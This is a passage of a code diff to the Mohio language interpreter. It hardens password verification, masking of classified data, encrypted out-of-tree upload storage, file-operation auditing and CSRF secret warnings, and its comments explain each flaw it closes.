                 result = base64.b64decode(raw.encode()).decode()
@@ -13858,9 +17810,13 @@ class MohioInterpreter:
             elif fmt == 'hex':
                 result = bytes.fromhex(raw).decode()
             else:
-                result = raw
+                result = _html.unescape(raw)
         except Exception:
-            result = raw
+            raise MohioRuntimeError(
+                "decode: this value is not valid " + fmt + ", so there is nothing to decode."
+                + chr(10) +
+                "    Returning it undecoded is what this used to do, which let a program carry "
+                "on with the raw value as though it had been decoded.")
         mv = MohioValue(result)
         alias = getattr(node, 'alias', '')
         if alias:
@@ -14004,12 +17960,36 @@ class MohioInterpreter:
     # ── CheckAgainstStmt ────────────────────────────────────────────────
     # check form.password against member.hashed
     def _exec_CheckAgainstStmt(self, node, ctx):
-        import hashlib
+        import hashlib, hmac
         value  = self._eval(node.value,  ctx) if node.value  else MohioValue('')
         stored = self._eval(node.stored, ctx) if node.stored else MohioValue('')
         raw_value  = str(value.to_python()  if isinstance(value,  MohioValue) else value)
         raw_stored = str(stored.to_python() if isinstance(stored, MohioValue) else stored)
         # Verify against the stored hash, detecting the scheme from its format.
+        #
+        # TWO SILENT FAILURES CLOSED HERE (2026-09-01, both run-verified first).
+        #
+        # 1. A PLAINTEXT stored password AUTHENTICATED. The old final branch was
+        #    `match = (raw_value == raw_stored)`, commented "plaintext (dev only)" -- but
+        #    nothing made it dev-only and nothing said it had happened. An app that forgot to
+        #    hash its passwords logged people in and printed LOGGED IN, while `mio check`
+        #    (which announces "full compliance and security analysis") reported no errors.
+        #    The test that covered it called this "honest about being unverified rather than
+        #    throwing"; it was the opposite of honest, because the program could not tell.
+        #    A verifier that cannot verify must say so, not return True.
+        #
+        # 2. `hash using sha512` produced a hash this could NEVER verify. Only the 64-hex
+        #    sha256 length was recognised, so a sha512 digest fell through to the plaintext
+        #    compare and always answered "denied" -- indistinguishable from a wrong password,
+        #    which is the worst possible way to report an unsupported algorithm. Every digest
+        #    length `hash` can produce is recognised here now, so the two verbs agree.
+        #
+        # KNOWN LIMIT, stated rather than hidden: a bare digest carries no record of what made
+        # it, so recognising one by LENGTH is a guess -- a 64-character random token is not a
+        # sha256 hash. bcrypt and pbkdf2 do not have this problem because each writes its own
+        # scheme into the stored string. Tagging bare digests the same way is a design change,
+        # queued as T1-HASH-SCHEME-TAG rather than invented here.
+        _HEX_DIGEST_ALGOS = {56: 'sha224', 64: 'sha256', 96: 'sha384', 128: 'sha512'}
         match = False
         if raw_stored.startswith('$2'):                       # bcrypt
             try:
@@ -14023,13 +18003,28 @@ class MohioInterpreter:
                 _, iters, salt_hex, dk_hex = raw_stored.split('$')
                 dk = hashlib.pbkdf2_hmac('sha256', raw_value.encode(),
                                          binascii.unhexlify(salt_hex), int(iters))
-                match = (binascii.hexlify(dk).decode() == dk_hex)
+                match = hmac.compare_digest(binascii.hexlify(dk).decode(), dk_hex)
             except Exception:
                 match = False
-        elif len(raw_stored) == 64 and all(c in '0123456789abcdef' for c in raw_stored.lower()):
-            match = (hashlib.sha256(raw_value.encode()).hexdigest() == raw_stored.lower())
+        elif (len(raw_stored) in _HEX_DIGEST_ALGOS
+              and all(c in '0123456789abcdef' for c in raw_stored.lower())):
+            _algo = _HEX_DIGEST_ALGOS[len(raw_stored)]
+            # compare_digest, not `==`: this runs on the login path, and a plain string
+            # comparison returns early on the first differing character.
+            match = hmac.compare_digest(
+                getattr(hashlib, _algo)(raw_value.encode()).hexdigest(), raw_stored.lower())
         else:
-            match = (raw_value == raw_stored)                 # plaintext (dev only)
+            raise MohioRuntimeError(
+                "check ... against: the stored value is not a hash this can verify, so there "
+                "is nothing to check against." + chr(10) +
+                "    It is not bcrypt ($2...), not pbkdf2 (pbkdf2_sha256$...), and not a "
+                "sha224/sha256/sha384/sha512 digest." + chr(10) +
+                "    If the stored password was never hashed, that is the bug: this used to "
+                "compare the two strings directly, so a plaintext password logged the user "
+                "IN and said nothing. Hash it on the way in with `hash <value> as <name> "
+                "using bcrypt`." + chr(10) +
+                "    To compare two ordinary values, use `check` / `when`, not "
+                "`check ... against`, which is for verifying a hash.")
         handlers = getattr(node, 'body', []) or []
         if match:
             for h in handlers:
@@ -14039,6 +18034,20 @@ class MohioInterpreter:
             for h in handlers:
                 if isinstance(h, OnFailure):
                     return self._exec_block(h.body, ctx)
+        # `otherwise` -- the fallback of the block's condition stage, per result_handlers' own
+        # design spec: it runs when no other handler fired. `check ... against` took its
+        # handlers from the shared rule on 2026-09-02 (D-sweep), which is what made `otherwise`
+        # WRITABLE here. Before that it had a hand-rolled `_OTHERWISE body_stmt*` that built no
+        # node and could never run; writable-and-unwired would have been the same silent no-op
+        # with a different cause, so it is dispatched here.
+        # A NON-match with no `on.failure` is exactly the "wrong password" path, which is the
+        # case a login page most needs to handle, and it had nowhere to go.
+        _fired = any(isinstance(h, OnSuccess) for h in handlers) if match else \
+                 any(isinstance(h, OnFailure) for h in handlers)
+        if not _fired:
+            for h in handlers:
+                if type(h).__name__ in ('OtherwiseClause', 'Otherwise'):
+                    return self._exec_block(getattr(h, 'body', []) or [], ctx)
         return MohioValue(match, 'boolean')
 
 
@@ -14071,6 +18080,21 @@ class MohioInterpreter:
         # (Reserved statement keywords mis-parsed as an assignment target -- connect,
         # verify, find, retrieve, update, grab -- are now caught at transform time so
         # `mio check` reports them with the correct form.)
+        # `n as "grand_total"` -- rename an existing value, with no new value of its own. The
+        # name must already exist: renaming something that was never declared is a typo, not a
+        # rename, and inventing an empty variable for it is the silent-default shape this
+        # project treats as its highest-severity class.
+        if getattr(node, 'rename_only', False):
+            _new = getattr(node, 'rename_to', '') or ''
+            if not ctx.exists(node.name):
+                raise _Raise(
+                    error_name='unknown_variable',
+                    message=(f"`{node.name} as \"{_new}\"` renames `{node.name}`, but nothing "
+                             f"called `{node.name}` has been declared."),
+                    line=getattr(node, 'line', None),
+                    hint=f"Declare it first (`{node.name} <value>`), or check the spelling.")
+            ctx.set(_new, ctx.get(node.name))
+            return None
         # Three tiers: a bare variable changes freely; a `hold` value is frozen
         # until `release`; a `lock` value is permanent and never changes.
         if ctx.is_locked(node.name):
@@ -14195,6 +18219,18 @@ class MohioInterpreter:
             ctx.set_persistent(node.name, value)
         else:
             ctx.set(node.name, value)
+        # THE QUOTED RENAME TAIL binds the SAME value under the given name as well.
+        # `total (price + tax) as "grand_total"` leaves `total` bound exactly as it always was
+        # and adds `grand_total` beside it. Both, deliberately: the author wrote both names on
+        # the line, and dropping the one they typed first would make the tail a silent rebind
+        # rather than a rename. It is additive by construction -- no existing program has this
+        # tail, so nothing that works today sees a different binding.
+        _rename = getattr(node, 'rename_to', None)
+        if _rename:
+            if getattr(self, '_session_mode', False):
+                ctx.set_persistent(_rename, value)
+            else:
+                ctx.set(_rename, value)
         if self.verbose: print(f"  [assign] {node.name} = {value}")
         return value
 
@@ -14387,8 +18423,55 @@ class MohioInterpreter:
                         return MohioValue(_d.explanation or '', 'string')
 
             if node.parts and isinstance(val, MohioValue):
-                if self._pci_fields and node.parts[-1] in self._pci_fields:
-                    val.data_class = 'pci'
+                # BOTH MASKED CLASSIFIERS, not just pci. `data_class` is what carries a
+                # classification through concatenation, so a value built with `&` still masks
+                # on the way out. Measured over real HTTP: a [pci] field concatenated into a
+                # string masked correctly, and the identical program with [phi] returned the
+                # value in the clear -- the same protection, present for one classifier and
+                # absent for its sibling, which is the shape a per-tag rule always fails in.
+                # CLASSIFICATION IS BOUND TO THE VALUE, NOT TO THE NAME IT WAS READ THROUGH.
+                # This is the whole of the derived-variable fix and it is one line, because the
+                # mechanism already existed and only pci was using it. Measured before the
+                # change, the same program with each tag:
+                #
+                #     x p.ssn then give back x      [pci] masked   [phi] PLAINTEXT
+                #     hold s = p.ssn then give back [pci] masked   [phi] PLAINTEXT
+                #     concatenated into a string    [pci] masked   [phi] PLAINTEXT
+                #     passed into a task, returned  [pci] masked   [phi] PLAINTEXT
+                #
+                # The egress mask matches a field NAME, so once the value sits in `x` there is
+                # no name left to match and it went out whole. `data_class` travels WITH the
+                # value through assignment, hold, concatenation and a task boundary, which is
+                # why pci survived all four. phi simply never set it.
+                #
+                # Ruled: a tag is the field's classification for the life of the value, so
+                # copying it must not strip it.
+                # PII TRAVELS TOO, and that is not a change to what pii MEANS at egress. The
+                # two lists are separate on purpose: `_VALUE_MASKED_CLASSES` decides what is
+                # hidden when it is shown, and pii is deliberately absent from it because the
+                # everyday case for pii is showing a person their own email. What a value is
+                # made of, and whether it is written to disk readable, is a different question,
+                # and pii already answers it the same way as the other two in its own column.
+                #
+                # Measured before this, the same request field copied into an untagged column:
+                #
+                #     [phi] -> CIPHERTEXT   [pci] -> CIPHERTEXT   [pii] -> ada@example.com
+                #
+                # So a tag that encrypts at rest stopped encrypting the moment the value was
+                # copied, for one classifier out of three.
+                _fld = str(node.parts[-1])
+                for _cls in ('phi', 'pci', 'pii'):
+                    if self.classification.has(_fld, _cls):
+                        val.data_class = _cls
+                        break
+                # `never store` AND `never log` TRAVEL TOO, for the reason the classification
+                # tags do: a rule that only knows a column name protects the value until the
+                # moment someone copies it, which is the moment it most needs protecting.
+                # Measured before this: a `never store` value copied into a variable and saved
+                # to another column was written to disk, and the refusal never fired.
+                for _rule in ('never_store', 'never_log'):
+                    if self.classification.has(_fld, _rule):
+                        val.handling = _rule if val.handling is None else val.handling
                 if self._field_purposes and node.parts[-1] in self._field_purposes:
                     # attach collection purposes so a copy/derived value stays purpose-checkable
                     val._purposes = set(self._field_purposes[node.parts[-1]])
@@ -14500,7 +18583,19 @@ class MohioInterpreter:
                 return MohioValue(int(secs / div), 'number')
             if cast == 'json':
                 import json as _json
-                return MohioValue(_json.dumps(raw, default=str), 'text')
+                # MASK BEFORE SERIALIZING. The egress mask reads a dict key to decide, so once
+                # the object is a JSON STRING there is no key left to read and every classified
+                # field goes out in the clear. Measured over real HTTP: `give back p` masked the
+                # phi field to ****1111 while `give back p as.json` on the same row returned
+                # 111-11-1111, because the cast ran first and handed masking a string.
+                _payload = self._apply_pci_mask(raw)
+                # A SCALAR CAST needs the field name too, for the same reason the give-back path
+                # does: there is no key to match on. Taken from the operand the author wrote.
+                if isinstance(_payload, str):
+                    _fld = self._egress_field_name(getattr(node, 'value', None))
+                    if _fld is not None and _fld in self._egress_masked_fields()                             and not _payload.startswith(self._ENC_PREFIX):
+                        _payload = self._mask_last4(_payload)
+                return MohioValue(_json.dumps(_payload, default=str), 'text')
             if cast in ('csv', 'pdf', 'html'):
                 raise _Raise('not_implemented',
                              f"as.{cast} is not yet implemented in this build.",
@@ -14634,6 +18729,7 @@ class MohioInterpreter:
             from mohio_ast import ConcatExpr
             parts = []
             pci_taint = False
+            masked_spans = []
             purpose_taint = None
             purpose_fields = None
             for term in (node.terms or []):
@@ -14643,8 +18739,25 @@ class MohioInterpreter:
                 # zero-filled; everything else uses normal text. Raw numeric value stays for math.
                 parts.append(self._display_text(v))
                 if isinstance(v, MohioValue):
-                    if getattr(v, 'data_class', None) == 'pci':
-                        pci_taint = True
+                    # ANY MASKED CLASSIFICATION TAINTS, not only pci. This read the one name,
+                    # so a string built from a [phi] value carried nothing and went out in the
+                    # clear while the identical program with [pci] masked. The taint now keeps
+                    # WHICH class it came from, so the mask applied downstream is the one the
+                    # field actually declared rather than pci by assumption.
+                    # ANY masked classification taints a string built from it, not only pci.
+                    # The taint keeps WHICH class it came from, so what gets applied downstream
+                    # is the class the field actually declared.
+                    _dc = getattr(v, 'data_class', None)
+                    if _dc in ('pci', 'phi'):
+                        pci_taint = _dc
+                        # WHERE the secret sits in the joined string, so only that part is
+                        # hidden later. Masking the whole result turned `"the ssn is " & p.ssn`
+                        # into `****1111`, destroying the sentence the program wrote in order to
+                        # protect the four characters inside it. The span is recorded here
+                        # because this is the only point that still knows which term the value
+                        # came from; by the time it is displayed there is just one string.
+                        _start = sum(len(x) for x in parts[:-1])
+                        masked_spans.append((_start, _start + len(parts[-1]), _dc))
                     vp = getattr(v, '_purposes', None)
                     if vp:
                         purpose_taint = set(vp) if purpose_taint is None else (purpose_taint & set(vp))
@@ -14656,14 +18769,19 @@ class MohioInterpreter:
                 result._purposes = purpose_taint
                 if purpose_fields:
                     result._purpose_fields = purpose_fields
-            if pci_taint:
+            if pci_taint:  # holds the class name, not just a flag
                 # Taint (option B, 2026-07-07): a string built from a [pci] value carries the
                 # class, so it is masked on ANY display -- show AND give back -- not only when the
                 # field is referenced directly. A PAN cannot leak by being concatenated into a
                 # shown or returned string. The value stays full at rest and for internal use; to
                 # use the full number, pass the RAW value to a use channel, never a built string.
                 # NOTE: revisitable later (a show-masks / give-back-is-a-use split), tracked in docs.
-                result.data_class = 'pci'
+                result.data_class = pci_taint if isinstance(pci_taint, str) else 'pci'
+                # THE VALUE STAYS WHOLE, and only its display changes. Masking at this point
+                # instead would make the masked form the value itself, so a string built from a
+                # classified field and then SAVED would store `****1111` rather than the sealed
+                # real thing. What is protected is what leaves, not what is kept.
+                result._masked_spans = masked_spans
             return result
 
         if isinstance(node, ColorLit):
@@ -15045,6 +19163,19 @@ class MohioInterpreter:
                           f"spelling. Double braces {{ }} are reserved only for inserting a "
                           f"variable's value."))
             val = ctx.get_dotted(parts)
+            # TWO EGRESS PATHS, ONE RULE. A `[pci]` or `[phi]` field served as JSON is masked by
+            # `_giveback_masked`; the same field rendered into HTML went out in the clear, because
+            # this path resolves a SINGLE field and the dict-walking mask never sees it. Measured
+            # over real HTTP -- the JSON row answered `"pan": "****1111"` while the rendered page
+            # answered `<p>pan: 4111111111111111</p>` from the same stored row.
+            #
+            # Masked by the LAST path segment, which is the field name: `back.pan` is the `pan`
+            # field of a retrieved row, and the tag lives on the field, not on the row variable.
+            _masked_names = self._egress_masked_fields()
+            if _masked_names and parts and str(parts[-1]) in _masked_names:
+                _raw = val.to_python() if isinstance(val, MohioValue) else val
+                if isinstance(_raw, str) and not _raw.startswith(self._ENC_PREFIX):
+                    return self._mask_last4(_raw)
             out = self._display_text(val)
             if not escape:
                 return out
@@ -15152,13 +19283,286 @@ class MohioInterpreter:
                 except Exception: pass
         return props
 
-    def _store_uploads(self, shape, data):
-        """Write validated uploads to MOHIO_UPLOAD_DIR with a random, sanitized
-        filename (the submitted name never touches the path, so a crafted name
-        cannot escape the directory). Returns {field_name: stored_path}."""
+    # ── upload storage ───────────────────────────────────────────────────────────────────────
+    # THE DEFAULT WAS INSIDE THE SERVED DIRECTORY, and that is the whole of the exposure. The old
+    # default was `./uploads`, relative to the working directory, and the static file server falls
+    # back to the working directory when no app directory is set. Measured end to end on a
+    # [phi]-tagged upload, with no authentication of any kind:
+    #
+    #     GET /uploads/2b4819daafe845c7a9bdcc0b11c8d434.txt
+    #     200  SENSITIVE MEDICAL CONTENT
+    #
+    # So the file was readable by anyone with the link, and it was plaintext, while the database
+    # row holding its path was sealed and looked protected. Rooting the store at an absolute path
+    # outside the working directory removes it from the static root, which is the same move that
+    # makes it survive a redeploy. One default fixes both.
+    _UPLOAD_DIR_ENV = 'MOHIO_UPLOAD_DIR'
+
+    def _upload_root(self):
+        """Where uploads live: the env override, else an absolute path outside any deploy tree.
+
+        The precedent is `mio.py`'s `_resolve_sqlite_db_path`, which keeps the database out of the
+        project folder for the same reason: a deploy replaces the tree, and anything stored inside
+        it goes with it. An explicit override is honoured as written, including a relative one,
+        because a deployment that names its own durable mount has said what it wants.
+        """
+        import os
+        explicit = os.environ.get(self._UPLOAD_DIR_ENV)
+        if explicit:
+            return os.path.abspath(explicit)
+        return os.path.join(os.path.expanduser('~'), '.mohio', 'uploads')
+
+    def _upload_zone(self):
+        """The declared area uploads belong to, or None for the default local store.
+
+        A CLOUD AREA CLAIMS THEM. There is no syntax tying a shape field to an area, and none is
+        invented here: a program that declares cloud storage has said where its files go, so
+        uploads go there. Two cloud areas is the case that genuinely cannot be guessed, and it
+        refuses rather than picking the first, because picking would put a health record in
+        whichever bucket happened to be declared earlier.
+        """
+        clouds = [z for z in (getattr(self, '_miofile_zones', None) or [])
+                  if z.get('kind') == 'cloud']
+        if not clouds:
+            return None
+        if len(clouds) > 1:
+            raise _Raise(
+                error_name='upload_zone_ambiguous',
+                message=("This program declares more than one cloud storage area ("
+                         + ", ".join(sorted(str(z.get('name')) for z in clouds))
+                         + "), so there is no way to tell which one an upload belongs in."),
+                hint="Declare one cloud area for uploads, or keep the others local.")
+        return clouds[0]
+
+    def _upload_store(self):
+        """The object store uploads are written to and read back from.
+
+        THE ABSTRACTION ALREADY EXISTED AND NOTHING REACHED IT. `LocalObjectStore` and
+        `S3ObjectStore` are real, byte-native and tested, and no runtime path had ever called
+        them, while the upload path did its own `open(..., 'wb')` against a directory it computed
+        itself. Routing through the store is what makes a bucket deployment possible at all, and
+        it removes the second, hand-rolled storage mechanism.
+
+        Only get/put/delete/list are used. The conditional-write and lease methods belong to the
+        metasource's coordination protocol and mean nothing for a file.
+        """
+        cached = getattr(self, '_upload_store_cache', None)
+        if cached is not None:
+            return cached
+        from mohio_metasource_store import LocalObjectStore, S3ObjectStore
+        zone = self._upload_zone()
+        if zone is not None:
+            # THE ONLY NEW THING IS WHICH STORE ANSWERS. Everything around it is unchanged: the
+            # content is sealed before it is handed over, the handler's own access check runs
+            # before any read, and the bytes are unsealed by their marker afterwards. A bucket
+            # is a different place to put an object, not a different set of rules about it.
+            #
+            # The area's own settings win over the environment, because a program that names its
+            # bucket has said which bucket; the environment answers for whatever the program left
+            # unsaid, which is how the same build runs against a developer's MinIO and a
+            # production bucket without an edit.
+            _s = zone.get('settings') or {}
+            store = S3ObjectStore(
+                endpoint=_s.get('endpoint') or None,
+                bucket=_s.get('bucket') or None,
+                region=_s.get('region') or None,
+                access_key=_s.get('key') or None,
+                secret_key=_s.get('secret') or None)
+        else:
+            store = LocalObjectStore(self._upload_root())
+        self._upload_store_cache = store
+        return store
+
+    def _upload_is_classified(self, field):
+        """Does this upload field carry a classification that means seal the CONTENT?
+
+        Read off the field's own tag, never guessed from the bytes. The tag already sealed the
+        PATH, because the path is what the database column held; it never reached the file.
+        """
+        for m in (getattr(field, 'modifiers', None) or []):
+            if str(getattr(m, 'modifier_type', '')) == 'tag':
+                if str(getattr(m, 'value', '') or '').lower() in ('phi', 'pci'):
+                    return True
+        return bool(self.classification.has(getattr(field, 'name', ''), 'encrypted'))
+
+    def _seal_upload_body(self, content):
+        """The bytes an upload is stored AS.
+
+        CONTENT ENCRYPTION, which is what the tag was already claiming. A `[phi]` upload used to
+        put the file down in the clear beside a database row whose encrypted path made it look
+        protected, which is a worse position than no encryption at all: it reads as done.
+
+        The file is base64'd into text and sealed with the SAME field cipher, key management and
+        `enc:v1:` marker every classified value uses, so the object on disk is recognisably
+        Mohio ciphertext and unseals through the same code path. Base64 is what makes an
+        arbitrary binary file safe to hand to a cipher built for text; it costs a third in size,
+        which the mandatory `max size` on every upload field already bounds.
+
+        A byte-native streaming seal, which would avoid holding the file in memory, is the answer
+        for large media and is deliberately not built here.
+        """
+        import base64
+        raw = content if isinstance(content, (bytes, bytearray)) else str(content).encode('utf-8')
+        key = self._encryption_key()
+        if key is None:
+            raise _Raise(
+                error_name='encryption.key_missing',
+                message=("This upload is tagged for protection, so its CONTENT is encrypted "
+                         "before it is stored, and no encryption key is set. Refusing to store "
+                         "the file in the clear."),
+                hint="Set MOHIO_ENCRYPTION_KEY in the environment (a strong secret).")
+        return self._encrypt_field(base64.b64encode(raw).decode('ascii'), key).encode('ascii')
+
+    def _unseal_upload_body(self, body):
+        """The bytes an upload WAS, from whatever is stored.
+
+        Keyed on the marker, exactly like a field value: a stored object that says it is sealed
+        is unsealed, and one that does not is handed back untouched. That is what lets an
+        untagged upload stay plain bytes without anything having to remember which it was.
+        """
+        import base64
+        if not isinstance(body, (bytes, bytearray)):
+            return body
+        prefix = self._ENC_PREFIX.encode('ascii')
+        if not body.startswith(prefix):
+            return bytes(body)
+        key = self._encryption_key()
+        if key is None:
+            raise _Raise(
+                error_name='encryption.key_missing',
+                message=("This file is stored encrypted and no encryption key is set, so it "
+                         "cannot be read back. Refusing to hand back the ciphertext as if it "
+                         "were the file."),
+                hint="Set MOHIO_ENCRYPTION_KEY to the key this file was written with.")
+        return base64.b64decode(self._decrypt_field(body.decode('ascii'), key))
+
+    _FILE_OP_EVENTS = {'store': 'FILE_STORE', 'access': 'FILE_ACCESS', 'write': 'FILE_WRITE',
+                       'delete': 'FILE_DELETE', 'move': 'FILE_MOVE', 'copy': 'FILE_COPY'}
+
+    @staticmethod
+    def _looks_sealed(body):
+        """Does this content carry the encryption marker? The one question asked of it.
+
+        Never a guess about what the bytes MEAN, only whether they say what they are, which is
+        the same rule the read path uses to decide whether to unseal.
+        """
+        if isinstance(body, (bytes, bytearray)):
+            return bytes(body).startswith(MohioInterpreter._ENC_PREFIX.encode('ascii'))
+        return isinstance(body, str) and body.startswith(MohioInterpreter._ENC_PREFIX)
+
+    def _audit_file_op(self, op, key, encrypted, ctx=None, zone=None, source=None):
+        """Record a file being STORED or ACCESSED, and whether it was protected.
+
+        THE LINE AN AUDITOR HAS TO SEE is between a file that was encrypted and one that was
+        not. Everything else in the trail already records that data moved; nothing recorded
+        which files were protected when they moved, so proving a health record was sealed, and
+        showing plainly which files were not, meant reading storage rather than the trail.
+
+        ALWAYS ON, never gated on a sector. A compliance profile decides what a regulated
+        deployment must additionally do; it does not decide whether a file operation happened,
+        and a developer with no profile active has the same right to see unprotected content
+        moving. Gating this would make the record appear exactly when someone thought to turn it
+        on, which is not what a trail is for.
+
+        The KEY is recorded, never the content, and never the resolved filesystem path, which
+        would publish the store's layout. `zone` names the declared area and `destination` says
+        whether that area is a bucket or this machine, because those are different exposures for
+        the same plaintext.
+        """
+        # THE AREA IS PASSED IN WHEN THE CALLER KNOWS IT, and the file verbs do: a path in the
+        # file area is governed by whichever declared area covers it, which is not the area
+        # uploads go to. Recording an upload area's name on a `miofile.write` would be a false
+        # record in the field an auditor reads to know where the file went.
+        #
+        # `_upload_zone` cannot raise on the upload path: the store that just handled the file
+        # asked it first, so an ambiguous area has already refused the operation.
+        zone = zone if zone is not None else (self._upload_zone() or {})
+        # A program with no declared area stores in the default place, and `default` is that
+        # place's name rather than a stand-in for a missing one.
+        zone_name = zone.get('name') if zone.get('name') else 'default'
+        session_id, member_id = self._audit_actor(ctx) if ctx is not None else ('', '')
+        entry = {
+            'event':       self._FILE_OP_EVENTS.get(op, 'FILE_ACCESS'),
+            'op':          op,
+            'zone':        zone_name,
+            'destination': 'cloud' if zone.get('kind') == 'cloud' else 'local',
+            'key':         str(key),
+            'protection':  'encrypted' if encrypted else 'plaintext',
+            'session_id':  session_id,
+            'member_id':   member_id,
+        }
+        if source is not None:
+            # A move or a copy has two ends, and the pair is the point: content that was sealed
+            # where it came from and is being written somewhere less protected is the exposure
+            # this record exists to make visible.
+            entry['source'] = str(source)
+        # NOT WRAPPED IN A SWALLOW, unlike the boundary-send record beside it. `_audit_event`
+        # already has a failure policy of its own: a refused or undurable write propagates, and
+        # a non-required one prints its own alert and continues. Catching here would override
+        # that and lose exactly the case it exists to surface, which in a record about whether
+        # files were protected is the last thing to make quiet.
+        self._audit_logs.setdefault('data_audit_log', []).append(
+            self._audit_event('data_audit_log', entry, ctx))
+        return entry
+
+    def _warn_plaintext_to_cloud(self, key):
+        """Say so when unprotected content goes into a shared bucket.
+
+        THE TWO PLAINTEXT CASES ARE NOT THE SAME RISK, which is why only one of them warns. A
+        plaintext file on the machine the app runs on is reachable by whoever already has that
+        machine. A plaintext file in a bucket is reachable by anyone holding the bucket key,
+        which is a credential that gets shared with build systems, copied into deployment
+        settings, and handed to whoever needs to run something once. Warning about both would
+        make the one that matters ordinary.
+
+        This is not a refusal. Storing unencrypted content in a bucket is a legitimate thing to
+        do, and the coder chose it by not tagging the field; what they may not have chosen is
+        knowing where it lands.
+        """
+        if not getattr(self, '_plaintext_cloud_warned', False):
+            self._plaintext_cloud_warned = True
+            print("  [uploads] WARNING: unencrypted content is being stored in a cloud bucket. "
+                  "Anyone holding the bucket credential can download it, and that credential "
+                  "travels further than the app does. Tag the field [phi], [pci] or [pii] to "
+                  "have the content encrypted before it is stored.")
+
+    def read_upload(self, key, ctx=None):
+        """Read a stored upload back as its real bytes. Returns None when there is no such object."""
+        body, _etag = self._upload_store().get(str(key))
+        if body is None:
+            return None
+        _sealed = (isinstance(body, (bytes, bytearray))
+                   and body.startswith(self._ENC_PREFIX.encode('ascii')))
+        self._audit_file_op('access', key, _sealed, ctx)
+        return self._unseal_upload_body(body)
+
+    def _store_uploads(self, shape, data, ctx=None):
+        """Store validated uploads and return {field_name: object key}.
+
+        The filename is a random UUID, so the submitted name never reaches the key and a crafted
+        one cannot steer where the object lands. Writes go through the object store, so the same
+        code serves a local directory and a bucket.
+        """
         import os, re as _re, uuid
         out = {}
-        updir = os.environ.get('MOHIO_UPLOAD_DIR', './uploads')
+        store = self._upload_store()
+        updir = self._upload_root()
+        def _say_once():
+            # SAID ONCE PER RUN, in the same voice the connect warnings use. A row pointing at
+            # a file that is no longer there is the quietest kind of data loss: the record
+            # reads fine and the thing it names is gone.
+            #
+            # AT THE FIRST ACTUAL WRITE, which is what the first version of this claimed and
+            # did not do: the notice sat above the loop that finds upload fields, so every
+            # shape request printed it, upload or not. A warning that fires on programs it
+            # does not apply to is noise, and noise is how the one that matters gets skipped.
+            if not getattr(self, '_upload_dir_warned', False):
+                self._upload_dir_warned = True
+                print(f"  [uploads] files are stored in {updir} and the database stores only "
+                      f"the key. That path is outside the deployed tree and outside the served "
+                      f"directory, so a redeploy does not remove it and no URL reaches it; on a "
+                      f"host with an ephemeral disk it still needs a durable mount.")
+
         for field in (getattr(shape, 'fields', None) or []):
             p = self._shape_field_props(field)
             if not p.get('is_upload'):
@@ -15179,13 +19583,37 @@ class MohioInterpreter:
                 raw = (content.decode('utf-8', errors='replace')
                        if isinstance(content, (bytes, bytearray)) else str(content))
                 content = sanitize_html(raw).encode('utf-8')
+            _say_once()
             fname = uuid.uuid4().hex + (('.' + ext) if ext else '')
-            os.makedirs(updir, exist_ok=True)
-            full = os.path.join(updir, fname)
-            with open(full, 'wb') as fh:
-                fh.write(content if isinstance(content, (bytes, bytearray))
-                         else str(content).encode('utf-8'))
-            out[p['name']] = full
+            # SEALED BEFORE IT IS STORED when the field is tagged, so what lands is ciphertext
+            # rather than the file. This is the half the tag was already claiming and never did.
+            body = (content if isinstance(content, (bytes, bytearray))
+                    else str(content).encode('utf-8'))
+            if self._upload_is_classified(field):
+                body = self._seal_upload_body(body)
+            # The browser's stated type is metadata for the store, never a trust signal: the
+            # extension allowlist and the size limit are what decide whether this file is
+            # accepted, and both ran already. When the upload carries no type, unknown bytes is
+            # the truthful description rather than a guess at one.
+            _ctype = fd.get('type')
+            if not _ctype:
+                _ctype = 'application/octet-stream'
+            # WARNED BEFORE THE OBJECT IS HANDED OVER, not after. The warning is about what
+            # this program is about to do, so it has to survive the attempt failing: a bucket
+            # that cannot be reached is exactly when a developer is looking at the output, and
+            # a warning that only appears on success would be missing every time.
+            _sealed = self._upload_is_classified(field)
+            if not _sealed and (self._upload_zone() or {}).get('kind') == 'cloud':
+                self._warn_plaintext_to_cloud(fname)
+            store.put(fname, body, content_type=_ctype)
+            # RECORDED AFTER THE WRITE SUCCEEDS. A record of a store that did not happen is the
+            # same false statement a tombstone for an erasure that did not happen would be.
+            self._audit_file_op('store', fname, _sealed, ctx)
+            # THE KEY CARRIES THE FIELD'S CLASS, so the write path seals the reference in the
+            # database exactly as it sealed the old path string. The reference is not the file,
+            # and now neither one is in the clear.
+            out[p['name']] = (ClassifiedText(fname, 'phi')
+                              if self._upload_is_classified(field) else fname)
         return out
 
     _EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
@@ -15460,9 +19888,16 @@ class MohioInterpreter:
                 s = env.encode('utf-8')
             else:
                 s = secrets.token_bytes(32)
-                if getattr(self, 'verbose', False):
-                    print("  [guard] MOHIO_SECRET not set; using a per-process key "
-                          "(form tokens reset on restart). Set MOHIO_SECRET in production.")
+                # UNCONDITIONAL, on stderr. Gated behind `verbose` this said nothing on a plain
+                # `mio serve`, so form tokens silently reset on every restart and in-flight
+                # forms failed with "Invalid or expired form token" and no explanation anywhere.
+                # A per-process key is a fine DEV default; being silent about it is not, and the
+                # saga compensation line on the same principle is already unconditional.
+                import sys as _sys
+                print("  [guard] MOHIO_SECRET is not set, so form tokens are signed with a "
+                      "per-process key and every restart invalidates the forms already open in "
+                      "someone's browser. Set MOHIO_SECRET to any long random string in "
+                      "production.", file=_sys.stderr)
             self._csrf_secret = s
         return s
 
@@ -15646,9 +20081,8 @@ class MohioInterpreter:
                     f"`{op}` cannot compare {lv!r} and {rv!r} -- they are not comparable "
                     f"values, so this condition cannot be answered (it would otherwise "
                     f"be silently false).")
-            if op == 'contains': return str(rv) in str(lv)
-            if op == 'starts':   return str(lv or '').startswith(str(rv))
-            if op == 'ends':     return str(lv or '').endswith(str(rv))
+            if op in ('contains', 'starts', 'ends'):
+                return _text_predicate(op, lv, rv)
             # Operator dispatch fell through: `op` is a comparison the evaluator does not
             # implement. Returning False here silently answered a question it did not
             # understand -- e.g. `(x = y)` (single `=`, which the grammar accepts via
@@ -15697,9 +20131,8 @@ class MohioInterpreter:
         `when contains "x"` form -- against the check subject `raw`."""
         s = raw.to_python() if isinstance(raw, MohioValue) else raw
         s = "" if s is None else str(s)
-        if op == 'contains': return str(val) in s
-        if op == 'starts':   return s.startswith(str(val))
-        if op == 'ends':     return s.endswith(str(val))
+        if op in ('contains', 'starts', 'ends'):
+            return _text_predicate(op, s, val)
         try:
             if op == 'minlen': return len(s) >= int(val)
             if op == 'maxlen': return len(s) <= int(val)
@@ -15919,14 +20352,144 @@ class MohioInterpreter:
